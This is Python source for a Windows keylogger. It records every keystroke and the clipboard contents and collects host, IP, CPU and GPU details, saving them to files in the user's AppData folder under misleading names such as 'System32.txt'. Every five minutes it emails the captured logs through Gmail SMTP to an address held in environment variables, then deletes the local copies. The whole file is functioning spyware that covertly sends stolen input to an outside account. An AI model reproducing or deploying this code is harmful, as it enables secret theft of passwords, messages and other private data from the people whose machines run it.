from requests import get # type: ignore
from pynput import keyboard # type: ignore
from threading import Timer
import os
import smtplib
import platform
import win32clipboard # type: ignore
import time
import getpass
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv # type: ignore
from datetime import datetime
from datetime import datetime
import GPUtil # type: ignore
import psutil # type: ignore
from tabulate import tabulate # type: ignore

load_dotenv()

path = os.environ['appdata'] +'\\' 

keylog="System32.txt"
syslog="System64.txt"
clipboard="SystemClip.txt"

c=1
username=getpass.getuser()

email_interval = 300

def send_email():
    global c
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    from_address = os.getenv('from_address')
    to_address = os.getenv('to_address')

    email=os.getenv('email')
    password=os.getenv('password')

    msg=MIMEMultipart()

    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Keylogger Report from "+username

    body = "Attached is the latest Report.\nDated : "+time.ctime(time.time())
    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(path+keylog, "rb") as attachment1:
            part1 = MIMEBase("application", "octet-stream")
            part1.set_payload(attachment1.read())
        encoders.encode_base64(part1)
        part1.add_header("Content-Disposition", "attachment; filename= %s" % keylog)
        msg.attach(part1)
    except Exception:
        keyLog('Keylog Empty')

    if(c==1):
        with open(path+syslog, "rb") as attachment2:
            part2 = MIMEBase("application", "octet-stream")
            part2.set_payload(attachment2.read())
        encoders.encode_base64(part2)
        part2.add_header("Content-Disposition", "attachment; filename= %s" %syslog)
        msg.attach(part2)


    with open(path+clipboard, "rb") as attachment3:
        part3 = MIMEBase("application", "octet-stream")
        part3.set_payload(attachment3.read())
    encoders.encode_base64(part3)
    part3.add_header("Content-Disposition", "attachment; filename= %s" %clipboard)
    msg.attach(part3)

    text = msg.as_string()

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email, password)
        server.sendmail(from_address, to_address, text)
        server.quit()
        os.remove(path+keylog)
        os.remove(path+clipboard)
        if c==1:
            os.remove(path+syslog)
        c=0
    except Exception as e:
        print(f"Failed to send email: {e}")
    
    getClipinfo()
    email_timer = Timer(email_interval, send_email)
    email_timer.start()

email_timer = Timer(email_interval, send_email)
email_timer.start()


def getSysInfo():
    with open(path+syslog,"a") as f:
        hostname=socket.gethostname()
        ip=socket.gethostbyname(hostname)
        f.write("\n====================System Information===============\n")
        f.write("Hostname : "+hostname)
        f.write("\nPrivate IP : "+ip)
        try:
            public_ip=get('https://api.ipify.org').content.decode('utf8')
            f.write("\nPublic IP : "+public_ip)
        except Exception:
            f.write("\nUnable to retrieve Public IP\n")
        f.write("\nProcessor : "+(platform.processor()))
        f.write("\nOperating System : "+(platform.system())+"--"+(platform.version()))
        f.write("\nMachine : "+(platform.machine()))
        f.write("\n==============Boot Time===============\n")
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        f.write(f"\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n")
        f.write("\n========================CPU Info====================\n")
        pcore=psutil.cpu_count(logical=False)
        tcore=psutil.cpu_count(logical=True)
        f.write("\nPhysical cores:"+str(pcore))
        f.write("\nTotal cores:"+str(tcore))
        cpufreq = psutil.cpu_freq()
        f.write(f"\nMax Frequency: {cpufreq.max:.2f}Mhz")
        f.write(f"\nMin Frequency: {cpufreq.min:.2f}Mhz")
        f.write(f"\nCurrent Frequency: {cpufreq.current:.2f}Mhz")
        f.write("\nCPU Usage Per Core:\n")
        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            f.write(f"\nCore {i}: {percentage}%")
        f.write(f"\n\nTotal CPU Usage: {psutil.cpu_percent()}%")
        f.write("\n===================GPU Details======================\n")
        gpus = GPUtil.getGPUs()
        list_gpus = []
        for gpu in gpus:
                gpu_id = gpu.id
                gpu_name = gpu.name
                gpu_load = f"{gpu.load*100}%"
                gpu_free_memory = f"{gpu.memoryFree}MB"
                gpu_used_memory = f"{gpu.memoryUsed}MB"
                gpu_total_memory = f"{gpu.memoryTotal}MB"
                gpu_temperature = f"{gpu.temperature} °C"
                gpu_uuid = gpu.uuid
                list_gpus.append((
                    gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                    gpu_total_memory, gpu_temperature, gpu_uuid
                ))
        f.write(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                            "temperature", "uuid")))  

getSysInfo()


def getClipinfo():
    with open(path+clipboard,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            clip_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard data \n"+clip_data)
        except Exception:
            f.write("Clipboard data not copied")

getClipinfo()

def keyLog(key):
    with open(path+keylog,"a") as f:
        k = str(key).replace("'", "")
        if k.find('backspace') > 0:
            f.write(' Backspace ')
        elif k.find('enter') > 0:
            f.write('\n')
        elif k.find('shift') > 0:
            f.write(' Shift ')
        elif k.find('space') > 0:
            f.write(' ')
        elif k.find('caps_lock') > 0:
            f.write(' caps_lock ')
        elif k.find('ctrl') > 0:
            f.write(' Ctrl ')
        elif k.find('Key'):
            f.write(k)

with keyboard.Listener(on_press=keyLog) as listener:
    listener.join()
